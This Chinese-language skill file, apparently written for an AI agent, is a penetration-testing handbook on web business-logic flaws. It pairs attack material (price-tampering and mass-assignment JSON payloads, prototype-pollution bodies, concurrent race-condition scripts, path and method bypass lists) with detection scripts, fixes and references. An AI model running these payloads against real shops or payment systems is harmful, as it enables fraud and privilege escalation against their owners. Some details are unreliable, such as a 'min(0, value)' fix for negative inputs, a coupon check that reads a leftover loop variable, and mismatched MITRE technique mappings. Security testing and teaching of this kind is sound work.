---
name: web-logic-vulns
description: >
  全面覆盖 Web 应用业务逻辑漏洞的识别、利用、检测和修复。
  涵盖业务逻辑缺陷（价格篡改、条件竞争、工作流绕过、负数攻击、整数溢出、
  多步骤认证绕过）、竞态条件（Race Condition / TOCTOU）利用与检测、
  大规模赋值（Mass Assignment / Autobinding）攻击与防御，
  包含函数级别授权绕过（BFLA）、broken function level authorization、
  以及各类逻辑缺陷的自动化测试方法论。
domain: cybersecurity
subdomain: web-security
tags: [business-logic, race-condition, mass-assignment, toctou, price-manipulation, workflow-bypass, integer-overflow, owasp-a04, owasp-a01]
version: 2.0.0
---

# Web 业务逻辑漏洞 — 完整攻防手册

## 适用场景

- 电商/金融应用中存在价格、数量、折扣相关的计算逻辑
- 多步骤流程（注册→验证→激活、下单→支付→发货）需要评估绕过可能
- API 端点允许用户提交 JSON 且后端使用自动绑定（ORM/DTO 映射）
- 高并发操作（转账、抢购、投票）需要评估竞态条件
- 应用有角色/权限分层（普通用户 vs 管理员），需要测试水平/垂直越权

**不适用**：纯注入类漏洞（XSS/SQLi/SSRF）、纯配置错误

---

## Part A：攻击方法论

### 1. 业务逻辑缺陷

#### 1.1 价格篡改

```
# 电商价格篡改攻击向量

# 攻击 1：修改价格参数
POST /api/checkout
{
  "items": [{"id": 1, "price": 0.01, "quantity": 1}],
  "total": 0.01
}

# 攻击 2：负数攻击
POST /api/checkout
{
  "items": [{"id": 1, "price": 99.99, "quantity": 1}],
  "coupon": "DISCOUNT100",
  "discount": -999999   # 负折扣 → 总价变为负数 → 退款
}

# 攻击 3：整数溢出
POST /api/checkout
{
  "items": [{"id": 1, "price": 99.99, "quantity": 2147483647}],
  "total": -2147483647  # 32 位整数溢出 → 负数或 0
}

# 攻击 4：浮点精度
POST /api/checkout
{
  "items": [{"id": 1, "price": 0.1, "quantity": 3}],
  "total": 0.30000000000000004  # 浮点精度问题
}

# 攻击 5：币种混淆
POST /api/checkout
{
  "items": [{"id": 1, "price": 1, "currency": "USD"}],
  "charge_currency": "JPY"  # 1 USD 按 1 JPY 结算
}

# 攻击 6：数量+价格解耦
POST /api/checkout
{
  "items": [
    {"id": 1, "price": 99.99, "quantity": 1},
    {"id": 2, "price": 0.01, "quantity": 1}
  ],
  "apply_quantity_discount": true,
  "total_quantity": 100  # 虚报总数量获取折扣
}
```

#### 1.2 工作流绕过

```
# 多步骤流程绕过

# 场景 1：跳过支付步骤
# 正常流程：/cart → /shipping → /payment → /confirm → /success
# 绕过：直接访问 /confirm 或 /success
GET /api/order/confirm?order_id=123  # 跳过支付直接确认

# 场景 2：跳过邮箱验证
# 正常：/register → /verify?token=xxx → /account
# 绕过：直接访问 /account 或设置 verified=true
POST /api/register
{"email": "victim@target.com", "password": "P@ss123", "is_verified": true}

# 场景 3：绕过审批流程
# 正常：submit → manager_approve → finance_approve → execute
# 绕过：直接调用 execute 端点
POST /api/transfer/execute
{"transfer_id": "TXN123", "status": "approved"}

# 场景 4：状态枚举+直接设置
# 正常：order 状态 pending → paid → shipped → delivered
# 绕过：直接设置状态
PATCH /api/orders/123
{"status": "delivered"}  # 跳过中间状态

# 场景 5：利用参数覆盖跳过步骤
POST /api/checkout/step2
{
  "shipping_address": {...},
  "step": 3,          # 跳到步骤 3
  "payment_verified": true  # 直接标记支付已验证
}
```

#### 1.3 条件/限制绕过

```
# 限制绕过攻击向量

# 攻击 1：时间限制绕过
# 限时优惠 / 投票截止
# 修改客户端时间或直接发送过期时间
POST /api/vote
{"poll_id": 1, "option": "A", "timestamp": "2099-12-31T23:59:59Z"}

# 攻击 2：频率限制绕过
# 方法 A：参数污染 /api/vote?a=1&a=2
# 方法 B：修改分页参数 /api/data?limit=99999999
# 方法 C：使用不同的 HTTP 方法 GET/POST/PUT
# 方法 D：添加额外参数 /api/vote?_bypass=1
# 方法 E：修改 User-Agent / X-Forwarded-For

# 攻击 3：引用限制绕过
# 邀请码只能用一次 → 重放请求
POST /api/apply-referral
{"code": "REFERRAL123"}
# 多次发送相同请求（如果服务端未做幂等性检查）

# 攻击 4：账户限制绕过
# 免费用户限制 10 次调用 → 修改计划参数
POST /api/subscribe
{"plan": "free", "limits": {"calls": 999999}}
```

### 2. 竞态条件（Race Condition / TOCTOU）

#### 2.1 经典竞态条件

```
# 转账竞态 — 同时发起多次转账
# 余额: 1000, 转账: 1000, 预期: 1 次成功, 竞态结果: 多次成功

# 单线程攻击（简单重放）
# 同时发送 10-20 个相同请求
POST /api/transfer HTTP/1.1
{"to": "attacker", "amount": 1000}

# 使用 Burp Turbo Intruder 或自定义脚本并发发送
```

```python
# Python 竞态条件利用脚本
import threading
import requests

URL = "https://target.com/api/transfer"
COOKIES = {"session": "abc123"}
PAYLOAD = {"to": "attacker", "amount": 1000}
THREADS = 20

results = []
def transfer():
    r = requests.post(URL, json=PAYLOAD, cookies=COOKIES)
    results.append((r.status_code, r.text))

threads = []
for _ in range(THREADS):
    t = threading.Thread(target=transfer)
    threads.append(t)

# 同时启动所有线程
for t in threads:
    t.start()
for t in threads:
    t.join()

success = sum(1 for status, _ in results if status == 200)
print(f"成功次数: {success}/{THREADS}")
```

#### 2.2 HTTP/2 单包攻击（Single-Packet Attack）

```
# HTTP/2 Single-Packet Race Condition（James Kettle, DEF CON 31）
# 原理：将多个 HTTP/2 请求放在同一个 TCP 包中
# 服务器几乎同时处理，消除网络延迟差异

# 使用 Burp Suite Turbo Intruder 的 HTTP/2 引擎
# 或使用 rustcat / h2-spacer 工具

# Burp Turbo Intruder 脚本:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=EngineType.BURP2  # HTTP/2
                          )
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # 同时释放所有请求

def handleResponse(req, interesting):
    table.add(req)
```

#### 2.3 TOCTOU（Time-of-Check-Time-of-Use）

```
# 文件操作 TOCTOU
# 1. 检查文件权限 (Time-of-Check) → 通过
# 2. 使用文件 (Time-of-Use)
# 在 1 和 2 之间，文件被替换为符号链接

# Web 应用 TOCTOU 示例
# 步骤 1：上传 benign.pdf → 安全扫描通过
# 步骤 2：在扫描和保存之间，将文件替换为 malicious.pdf
# 利用：通过竞态条件在扫描完成后替换文件

# API 参数 TOCTOU
# 步骤 1：验证用户是否有权限操作 resource_id=123
# 步骤 2：执行操作时使用 resource_id=456（攻击者在步骤间修改）
POST /api/update
{"resource_id": 123, "value": "safe"}
# 竞态修改为:
{"resource_id": 456, "value": "malicious"}  # 456 是其他用户的资源
```

#### 2.4 优惠券/礼品卡竞态

```python
# 优惠券多次使用攻击
import asyncio
import aiohttp

async def redeem_coupon(session, code):
    async with session.post(
        "https://target.com/api/coupon/redeem",
        json={"code": code},
        cookies={"session": "abc123"}
    ) as resp:
        return await resp.json()

async def race_coupon(code, count=20):
    async with aiohttp.ClientSession() as session:
        tasks = [redeem_coupon(session, code) for _ in range(count)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("success"))
        print(f"成功兑换: {success} 次")

asyncio.run(race_coupon("DISCOUNT50"))
```

### 3. 大规模赋值（Mass Assignment）

#### 3.1 识别 Mass Assignment

```
# 检测方法：
# 1. 提交正常请求，观察响应
# 2. 添加额外字段，观察是否被处理
# 3. 通过错误消息或行为变化确认字段被接受

# 常见漏洞框架：
# Ruby on Rails (strong parameters 之前)
# ASP.NET MVC (模型绑定)
# Spring MVC (@RequestBody 自动绑定)
# Laravel (Mass Assignment $fillable/$guarded)
# Django (ModelForm 自动字段)
# Express/Mongoose (默认允许所有字段)
```

#### 3.2 Mass Assignment 利用

```json
// 攻击 1：提升权限
// 正常请求: PUT /api/users/123
// {"name": "John", "email": "john@test.com"}
// 添加: {"role": "admin", "is_admin": true, "user_type": "superuser"}
{"name": "John", "email": "john@test.com", "role": "admin"}

// 攻击 2：绕过付费
// POST /api/subscribe
// {"plan": "premium", "price_override": 0}
{"plan": "premium", "billing_amount": 0, "trial_days": 36500}

// 攻击 3：修改其他用户数据
// PUT /api/users/me
// {"name": "Attacker", "id": 456}  // 修改 ID 操作其他用户

// 攻击 4：修改内部字段
// POST /api/register
// {"username": "attacker", "password": "P@ss", "email_verified_at": "2024-01-01",
//  "credits": 999999, "account_balance": 1000000}

// 攻击 5：嵌套对象注入
// PUT /api/orders/123
// {"status": "pending", "user": {"role": "admin", "credit_limit": 999999}}

// 攻击 6：原型链污染（JavaScript/Node.js）
// POST /api/users
// {"name": "Attacker", "__proto__": {"isAdmin": true}}
// 或 {"constructor": {"prototype": {"isAdmin": true}}}
```

#### 3.3 自动化 Mass Assignment 测试

```bash
# 使用 Arjun / ffuf 发现隐藏参数
# Arjun
arjun -u https://target.com/api/users/123 -m PUT

# ffuf
ffuf -u https://target.com/api/users/123 \
  -X PUT -H "Content-Type: application/json" \
  -d '{"FUZZ":"test"}' \
  -w /path/to/parameter-wordlist.txt

# 常见敏感参数词表
# role, is_admin, admin, user_type, account_type
# price, amount, total, discount, credits, balance
# verified, email_verified, is_active, status
# password_hash, salt, token, api_key, secret
# created_at, updated_at, deleted_at
# __proto__, constructor, prototype
```

### 4. 函数级别授权绕过（BFLA）

#### 4.1 识别 BFLA

```
# BFLA = Broken Function Level Authorization
# 用户可以调用不应该有权访问的 API 函数/端点

# 测试方法：
# 1. 以管理员身份执行操作，记录所有 API 调用
# 2. 以普通用户身份重放这些调用
# 3. 检查是否成功执行

# 常见 BFLA 场景：
# - 普通用户调用管理 API
# - 用户 A 调用用户 B 的操作
# - 未认证用户调用需要认证的端点
```

#### 4.2 BFLA 利用

```bash
# 水平越权（IDOR + BFLA）
# 正常: DELETE /api/users/me/posts/123
# 越权: DELETE /api/users/456/posts/789

# 垂直越权（角色提升）
# 管理员端点: POST /api/admin/users/ban
# 普通用户尝试: curl -X POST -b "session=user_session" \
#   https://target.com/api/admin/users/ban -d '{"user_id":456}'

# API 版本绕过
# /api/v1/admin/dashboard → 403
# /api/v2/admin/dashboard → 200 (新版本忘记加鉴权)

# HTTP 方法绕过
# GET /api/admin/users → 403
# POST /api/admin/users → 200
# PUT /api/admin/users → 200
# DELETE /api/admin/users → 200

# 路径绕过
# /api/admin/users → 403
# /api/admin/users/ → 200 (尾部斜杠)
# /api/admin/Users → 200 (大小写)
# /api/./admin/users → 200 (路径穿越)
# /api/admin/users%00 → 200 (空字节)
```

---

## Part B：检测与防御

### 5. 检测方法

#### 5.1 竞态条件检测

```python
# 自动化竞态条件检测脚本
import asyncio
import aiohttp
import time

class RaceConditionDetector:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.cookies = {"session": session_cookie}

    async def send_concurrent(self, method, path, payload, count=10):
        async with aiohttp.ClientSession(cookies=self.cookies) as session:
            url = f"{self.base_url}{path}"
            tasks = []
            for _ in range(count):
                if method == "POST":
                    tasks.append(session.post(url, json=payload))
                elif method == "PUT":
                    tasks.append(session.put(url, json=payload))
                elif method == "DELETE":
                    tasks.append(session.delete(url))

            results = await asyncio.gather(*[self._handle(r) for r in tasks])
            return results

    async def _handle(self, coro):
        async with coro as resp:
            return {"status": resp.status, "body": await resp.json()}

    def detect_transfer_race(self):
        """检测转账竞态"""
        results = asyncio.run(
            self.send_concurrent("POST", "/api/transfer",
                               {"to": "test", "amount": 1000}, 20)
        )
        success_count = sum(1 for r in results if r["status"] == 200)
        if success_count > 1:
            return {"vulnerable": True, "success_count": success_count}
        return {"vulnerable": False}
```

#### 5.2 Mass Assignment 检测

```bash
# 使用 ffuf 检测 Mass Assignment
#!/bin/bash
TARGET="https://target.com/api/users/me"
COOKIE="session=abc123"
WORDLIST="sensitive_params.txt"

while IFS= read -r param; do
    # 发送正常请求 + 额外参数
    response=$(curl -s -X PUT "$TARGET" \
      -H "Content-Type: application/json" \
      -b "$COOKIE" \
      -d "{\"name\":\"test\",\"$param\":\"test_value\"}")

    # 检查参数是否出现在响应中
    if echo "$response" | grep -q "$param"; then
        echo "[!] Parameter accepted: $param"
    fi
done < "$WORDLIST"
```

### 6. 修复方案

#### 6.1 业务逻辑防御

```python
# 服务端价格验证
class OrderService:
    def create_order(self, items, user):
        total = 0
        for item in items:
            # 从数据库获取真实价格，不信任客户端
            product = Product.query.get(item['product_id'])
            if not product:
                raise ValueError(f"Invalid product: {item['product_id']}")

            # 验证数量范围
            quantity = max(1, min(item.get('quantity', 1), product.max_quantity))

            # 使用服务端价格
            total += product.price * quantity

        # 不信任客户端提供的总价
        # 使用整数计算（分），避免浮点精度问题
        total_cents = int(round(total * 100))

        # 验证折扣
        discount_cents = 0
        if coupon := item.get('coupon'):
            coupon_obj = Coupon.get_valid(coupon)
            if coupon_obj:
                discount_cents = coupon_obj.calculate_discount(total_cents)
                # 确保折扣不超过总价
                discount_cents = min(discount_cents, total_cents)

        final_amount = total_cents - discount_cents
        if final_amount < 0:
            raise ValueError("Invalid order amount")

        return Order(total_cents=final_amount, items=items, user_id=user.id)
```

#### 6.2 竞态条件防御

```python
# 使用数据库行锁防止竞态条件
from django.db import transaction

@transaction.atomic
def transfer_money(from_user, to_user, amount):
    # SELECT FOR UPDATE 获取行锁
    sender = Account.objects.select_for_update().get(user=from_user)
    receiver = Account.objects.select_for_update().get(user=to_user)

    if sender.balance < amount:
        raise InsufficientFundsError()

    sender.balance -= amount
    receiver.balance += amount
    sender.save()
    receiver.save()

# Redis 分布式锁（高并发场景）
import redis
from redis.lock import Lock

r = redis.Redis()

def transfer_with_lock(from_user, to_user, amount):
    lock_key = f"transfer_lock:{from_user.id}"
    with r.lock(lock_key, timeout=5):
        # 在锁内执行转账逻辑
        do_transfer(from_user, to_user, amount)
```

```sql
-- 数据库层面的幂等性保证
-- 使用唯一约束防止重复操作
CREATE TABLE transfer_log (
    id SERIAL PRIMARY KEY,
    transfer_id VARCHAR(64) UNIQUE,  -- 唯一约束
    from_user INT REFERENCES users(id),
    to_user INT REFERENCES users(id),
    amount DECIMAL(10,2),
    created_at TIMESTAMP DEFAULT NOW()
);

-- 使用 INSERT ... ON CONFLICT 实现幂等
INSERT INTO transfer_log (transfer_id, from_user, to_user, amount)
VALUES ('TXN_123', 1, 2, 1000)
ON CONFLICT (transfer_id) DO NOTHING;
-- 返回 0 行 → 重复请求，忽略
```

#### 6.3 Mass Assignment 防御

```python
# Python — 显式白名单（推荐）
from pydantic import BaseModel

class UserUpdateDTO(BaseModel):
    """只允许更新的字段"""
    name: str
    email: str
    # 不包含 role, is_admin, credits 等敏感字段

@app.put("/api/users/me")
def update_user(data: UserUpdateDTO, current_user: User = Depends(get_user)):
    # Pydantic 会自动忽略额外字段
    current_user.name = data.name
    current_user.email = data.email
    current_user.save()
```

```java
// Java Spring — DTO 白名单
public class UserUpdateDTO {
    @NotBlank
    private String name;

    @Email
    private String email;

    // 不包含 role, isAdmin 等字段
    // getters and setters
}

@RestController
@RequestMapping("/api/users")
public class UserController {
    @PutMapping("/me")
    public ResponseEntity<?> update(@Valid @RequestBody UserUpdateDTO dto) {
        // 只接收 DTO 中定义的字段
    }
}
```

```php
// Laravel — $fillable 白名单
class User extends Model {
    protected $fillable = ['name', 'email'];
    // $guarded = ['*']; // 或阻止所有
}
```

#### 6.4 授权检查防御

```python
# 每个端点显式检查权限
from functools import wraps

def require_role(role):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, current_user=None, **kwargs):
            if not current_user or current_user.role != role:
                raise PermissionDenied("Insufficient privileges")
            return f(*args, current_user=current_user, **kwargs)
        return wrapper
    return decorator

@app.delete("/api/admin/users/<user_id>")
@require_role('admin')
def delete_user(user_id, current_user):
    # 只有 admin 角色可以访问
    # 额外检查：不能删除自己
    if user_id == current_user.id:
        raise PermissionDenied("Cannot delete self")
    User.delete(user_id)
```

---

## Part C：2025-2026 更新

### 7. OWASP Business Logic Abuse Top 10（全新 OWASP 项目）

```
来源：https://owasp.org/www-project-top-10-for-business-logic-abuse/
发布：2025年，OWASP 首个专门针对业务逻辑滥用的 Top 10 项目

背景：
传统 OWASP Top 10 聚焦技术漏洞（注入、XSS 等）
业务逻辑漏洞因需理解应用上下文，长期缺乏系统化分类
此项目首次提供跨域、跨技术栈的业务逻辑滥用结构化方法论

与 OWASP Top 10 2025 的关联：
A06: Insecure Design → CWE-841 (Improper Enforcement of Behavioral Workflow)
业务逻辑滥用是 Insecure Design 的核心体现

为什么传统扫描器检测不到：
1. 需要理解业务流程和意图（不仅是代码模式）
2. 每个"合法"请求单独看都是正常的
3. 漏洞存在于请求序列的组合逻辑中
4. 需要领域知识才能判断"正常"vs"滥用"

AI 辅助检测框架（MDPI 2025 研究）：
八阶段操作框架：
  阶段1: 业务流程建模（BPMN/状态机）
  阶段2: 正常用例定义
  阶段3: 异常用例生成
  阶段4: 约束违规检测
  阶段5: 状态转换验证
  阶段6: 授权策略审计
  阶段7: 数据流异常检测
  阶段8: 报告与修复建议
```

### 8. Single-Packet Attack 扩展（Flatt Security 研究）

```
来源：https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/
发现者：Flatt Security 研究团队

原版 Single-Packet Attack 限制：
  单个 TCP 包最大 65,535 字节
  每个 HTTP/2 请求约 200-2000 字节
  → 单包最多容纳 20-30 个请求
  → 对于需要更多并发的场景不够用

First Sequence Sync 技术：
  原理：利用 TCP 序列号同步机制
  1. 先发送一个特殊的"同步请求"建立基准
  2. 在同步点之后批量发送攻击请求
  3. 服务器在处理完同步请求后同时处理攻击请求组

  效果：突破 65,535 字节限制
  可在多个 TCP 包中实现等效的"同时到达"
  大幅提升竞态条件利用的成功率

攻击场景对比：
  ┌────────────────────┬──────────────┬──────────────────┐
  │ 技术                │ 请求容量      │ 精确度            │
  ├────────────────────┼──────────────┼──────────────────┤
  │ 经典并发            │ 无限制        │ 低（网络延迟影响） │
  │ HTTP/2 Single-Pkt  │ 20-30        │ 高（单包到达）     │
  │ First Sequence Sync│ 更大规模      │ 中高（多包同步）   │
  └────────────────────┴──────────────┴──────────────────┘

Turbo Intruder 支持状态：
  PortSwigger 已在 Turbo Intruder 中实现 single-packet attack
  脚本：race-single-packet-attack.py
  链接：https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py
```

### 9. Prototype Pollution 作为 Mass Assignment 升级路径

```
2025 年 Prototype Pollution CVE 爆发，直接关联 Mass Assignment 攻击面
CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

攻击链：
  Prototype Pollution → Object.prototype 污染
  → 所有后续对象继承被污染的属性
  → 等效于 Mass Assignment 但更隐蔽
  → 绕过显式白名单防护（因为污染发生在白名单过滤之前）

2025-2026 关键 CVE：
┌──────────────────┬──────────────────────┬──────────────────────────────────┐
│ CVE              │ 组件                  │ 利用方式                          │
├──────────────────┼──────────────────────┼──────────────────────────────────┤
│ CVE-2025-13465   │ Lodash               │ 深度合并时的原型污染               │
│ CVE-2026-42044   │ Axios                │ Prototype Pollution "Gadget" 攻击 │
│ CVE-2025-57325   │ Rollbar              │ utility.set 函数原型污染           │
│ CVE-2025-57319   │ fast-redact          │ Node.js 原型污染                   │
│ CVE-2025-8101    │ linkifyjs            │ 自定义 assign 函数原型污染→XSS     │
│ CVE-2025-32014   │ estree-util-value-…  │ valueToEstree 原型污染             │
│ CVE-2025-57353   │ messageformat        │ Runtime 组件原型污染               │
└──────────────────┴──────────────────────┴──────────────────────────────────┘

实战利用场景（API 环境原型污染 → 权限提升）：
  POST /api/users
  Content-Type: application/json

  {
    "name": "attacker",
    "__proto__": {
      "isAdmin": true,
      "role": "admin"
    }
  }

  或通过 constructor 绕过 __proto__ 过滤：
  {
    "name": "attacker",
    "constructor": {
      "prototype": {
        "isAdmin": true
      }
    }
  }

  或通过嵌套对象污染（绕过扁平化防护）：
  {
    "name": "attacker",
    "settings": {
      "__proto__": {
        "premium": true
      }
    }
  }

检测工具：
  ppmap — 自动化 Prototype Pollution 检测
  链接：https://github.com/kleiton0x00/ppmap

防御升级：
  1. 使用 Object.create(null) 创建纯净对象
  2. 使用 Map 代替 Object 存储用户输入
  3. 对所有 JSON 输入递归检查 __proto__/constructor 键
  4. 使用 schema 验证（Joi/Zod/Ajv）拒绝未知键
  5. 升级 Lodash 到 ≥4.17.21 / 使用 lodash-es
  6. 使用 --disable-proto=delete 编译选项（Node.js）
```

### 10. 2025-2026 CVE 速查

```
┌──────────────────┬──────┬───────────────────────┬──────────────────────────────┐
│ CVE 编号          │ 年份  │ 影响组件               │ 描述                          │
├──────────────────┼──────┼───────────────────────┼──────────────────────────────┤
│ CVE-2026-1600    │ 2026 │ Bhojon Restaurant     │ 业务逻辑漏洞导致 RCE           │
│ CVE-2026-0265    │ 2026 │ Palo Alto PAN-OS      │ JWT 伪造+逻辑缺陷绕过认证      │
│ CVE-2026-42044   │ 2026 │ Axios                 │ Prototype Pollution Gadget     │
│ CVE-2025-13465   │ 2025 │ Lodash                │ 深度合并原型污染                │
│ CVE-2025-57325   │ 2025 │ Rollbar               │ utility.set 原型污染           │
│ CVE-2025-57319   │ 2025 │ fast-redact           │ Node.js 原型污染               │
│ CVE-2025-8101    │ 2025 │ linkifyjs             │ 自定义 assign 原型污染→XSS     │
└──────────────────┴──────┴───────────────────────┴──────────────────────────────┘
```

### 11. 中文社区精华

```
┌────────────────────────────────────────────────────────────────────────────┐
│ 火山引擎开发者社区                                                         │
│ 《从零开始的业务逻辑漏洞挖掘》                                              │
│ 内容：业务逻辑漏洞挖掘方法论，强调需对整个业务流程有深入理解                    │
│ 链接：https://developer.volcengine.com/articles/7381507535301247027        │
├────────────────────────────────────────────────────────────────────────────┤
│ 漏洞盒子                                                                  │
│ 《电商行业业务逻辑漏洞分析》                                                │
│ 内容：支付场景、实名认证、购物订单、活动、身份认证等多维度分析                   │
│ 链接：https://www.vulbox.com/cases/bussiness                              │
├────────────────────────────────────────────────────────────────────────────┤
│ OWASP 官方项目                                                            │
│ 《OWASP Top 10 for Business Logic Abuse》                                 │
│ 内容：首个跨域业务逻辑滥用结构化分类，超越技术栈                              │
│ 链接：https://owasp.org/www-project-top-10-for-business-logic-abuse/      │
├────────────────────────────────────────────────────────────────────────────┤
│ MDPI 学术论文 (2025)                                                       │
│ 《Business Logic Vulnerabilities in the Digital Era: AI-Based Detection》  │
│ 内容：八阶段 AI 框架用于业务逻辑漏洞检测与缓解                                │
│ 链接：https://www.mdpi.com/2078-2489/16/7/585                             │
├────────────────────────────────────────────────────────────────────────────┤
│ Flatt Security (2025)                                                     │
│ 《Expanding Single-Packet Race Condition》                                 │
│ 内容：突破 TCP 65KB 限制的 First Sequence Sync 技术                        │
│ 链接：https://flatt.tech/research/posts/beyond-the-limit-expanding-       │
│       single-packet-race-condition-with-first-sequence-sync/               │
└────────────────────────────────────────────────────────────────────────────┘
```

### 12. 防御升级路线图

```
2025-2026 业务逻辑漏洞防御优先级：

[P0 - 立即] Prototype Pollution 防护
  │ 所有 JSON 输入递归过滤 __proto__/constructor/prototype 键
  │ 升级 Lodash/Axios/Rollbar 等依赖到最新安全版本
  │ 使用 Object.create(null) 或 Map 处理用户输入
  │
[P0 - 立即] 单包竞态防护
  │ 关键操作（转账/兑换/支付）实施服务端幂等性
  │ 使用 SELECT FOR UPDATE 或 Redis 分布式锁
  │ 添加请求唯一 ID（Idempotency-Key）强制去重
  │
[P1 - 本月] OWASP Business Logic Abuse Top 10 合规
  │ 按新 OWASP 项目清单逐项审计业务流程
  │ 建立 BPMN/状态机模型验证每个状态转换
  │ 确保工作流步骤不可跳过（服务端状态机强制）
  │
[P1 - 本月] Mass Assignment 加固
  │ 所有 API 端点使用 DTO 白名单（Pydantic/Zod/Joi）
  │ 禁止 ORM 自动绑定用户输入到模型字段
  │ 嵌套对象深度限制（防止深层注入）
  │
[P2 - 季度] AI 辅助检测部署
  │ 部署基于 AI 的业务逻辑异常检测
  │ 建立正常业务流程基线
  │ 监控偏离基线的异常操作序列
  │
[P3 - 持续] 自动化测试集成
  │ CI/CD 中集成业务逻辑回归测试
  │ 建立竞态条件自动化测试套件
  │ API 授权矩阵定期验证
```

### 13. 更新 MITRE ATT&CK 映射

| Tactic | Technique ID | Technique Name | 本 Skill 覆盖 |
|--------|-------------|----------------|---------------|
| Initial Access | T1190 | Exploit Public-Facing Application | BFLA/Mass Assignment 利用 |
| Persistence | T1098 | Account Manipulation | Mass Assignment 权限提升/原型链污染 |
| Privilege Escalation | T1078 | Valid Accounts | 角色篡改/JWT伪造 |
| Defense Evasion | T1144 | Gatekeeper Bypass | 工作流绕过 |
| Exfiltration | T1496 | Resource Hijacking | 竞态条件资源窃取 |
| Impact | T1499 | Endpoint Denial of Service | 竞态条件 |
| Execution | T1059 | Command/Scripting Interpreter | 原型污染→代码执行 |

---

## 速查表

### 业务逻辑漏洞类型矩阵

| 漏洞类型 | 攻击向量 | 检测方法 | 修复策略 |
|---------|---------|---------|---------|
| 价格篡改 | 修改价格/数量/折扣参数 | 对比服务端计算值 | 服务端从数据库取价格 |
| 负数攻击 | 负数数量/折扣/金额 | 输入验证 | min(0, value) 或拒绝负数 |
| 整数溢出 | 极大数量/金额 | 边界测试 | 使用 BigDecimal |
| 工作流绕过 | 跳过步骤/直接调用后续端点 | 逐步骤跳过测试 | 状态机 + 服务端验证 |
| 状态篡改 | 修改订单/申请状态 | 尝试设置非预期状态 | 状态转换白名单 |
| 频率限制绕过 | 参数污染/IP 伪造 | 多维度测试 | 服务端 rate limiting |
| 竞态条件 | 并发请求 | Turbo Intruder | 行锁/分布式锁/幂等 |

### 竞态条件攻击工具矩阵

| 工具 | 协议 | 并发方式 | 适用场景 |
|------|------|---------|---------|
| Burp Turbo Intruder | HTTP/1.1 + H2 | 单连接多路复用 | 精确时序控制 |
| Python asyncio | HTTP/1.1 | 多连接并发 | 自定义逻辑 |
| Go raceplanner | HTTP/1.1 | 多 goroutine | 高性能并发 |
| HTTP/2 Single-Packet | HTTP/2 | 单包多请求 | 最精确的竞态 |
| Burp Repeater | HTTP/1.1 | 手动重放 | 简单测试 |

### Mass Assignment 敏感参数检查清单

```
身份类: role, is_admin, admin, user_type, account_type, permissions, group_id
财务类: price, amount, total, discount, credits, balance, bonus, refund
认证类: password_hash, salt, token, api_key, secret, mfa_enabled
状态类: verified, email_verified, is_active, status, banned, suspended
时间类: created_at, updated_at, deleted_at, expires_at, trial_end
关系类: owner_id, creator_id, organization_id, parent_id
内部类: __proto__, constructor, prototype, __class__, class
```

---

## MITRE ATT&CK 映射

| Tactic | Technique ID | Technique Name | 本 Skill 覆盖 |
|--------|-------------|----------------|---------------|
| Initial Access | T1190 | Exploit Public-Facing Application | BFLA 利用 |
| Persistence | T1098 | Account Manipulation | Mass Assignment 权限提升 |
| Privilege Escalation | T1078 | Valid Accounts | 角色篡改 |
| Defense Evasion | T1144 | Gatekeeper Bypass | 工作流绕过 |
| Exfiltration | T1496 | Resource Hijacking | 竞态条件资源窃取 |
| Impact | T1499 | Endpoint Denial of Service | 竞态条件 |

---

## 前置条件

- 理解目标应用的业务逻辑和流程
- Burp Suite（Proxy、Repeater、Turbo Intruder）
- Python/Go 编程能力（编写竞态利用脚本）
- 理解数据库事务和锁机制
- 理解 API 认证和授权模型（RBAC/ABAC）
- HTTP/2 基础知识（Single-Packet 攻击）

---

## 参考资源

### 经典参考
- [PortSwigger — The Single-Packet Attack](https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local) — HTTP/2 单包竞态攻击原版研究
- [OWASP — Business Logic Vulnerability](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability) — OWASP 官方定义
- [OWASP — API Security Top 10](https://owasp.org/www-project-api-security/) — API5:2023 BFLA
- [HackTricks — Race Condition](https://hacktricks.wiki/en/pentesting-web/race-condition.html) — 竞态条件综合指南
- [PayloadsAllTheThings — Mass Assignment](https://swisskyrepo.github.io/PayloadsAllTheThings/IDOR%20and%20Mass%20Assignment/) — Mass Assignment payload 集合

### 2025-2026 新增参考
- [OWASP — Business Logic Abuse Top 10](https://owasp.org/www-project-top-10-for-business-logic-abuse/) — 首个跨域业务逻辑滥用 Top 10
- [Flatt Security — Expanding Single-Packet Attack](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) — 突破 65KB 限制
- [Turbo Intruder — race-single-packet-attack.py](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py) — 单包攻击脚本
- [MDPI — AI-Based BLV Detection](https://www.mdpi.com/2078-2489/16/7/585) — AI 辅助业务逻辑漏洞检测框架
- [YesWeHack — Race Condition Guide](https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-race-condition-vulnerabilities) — 综合竞态条件赏金指南
- [kleiton0x00/ppmap](https://github.com/kleiton0x00/ppmap) — Prototype Pollution 自动检测工具
- [Pentest-Tools — Business Logic Pentests](https://pentest-tools.com/blog/business-logic-vulnerabilities-pentests) — 三种创意业务逻辑利用方法

### 中文参考
- [火山引擎 — 从零开始的业务逻辑漏洞挖掘](https://developer.volcengine.com/articles/7381507535301247027)
- [漏洞盒子 — 电商行业业务逻辑漏洞分析](https://www.vulbox.com/cases/bussiness)
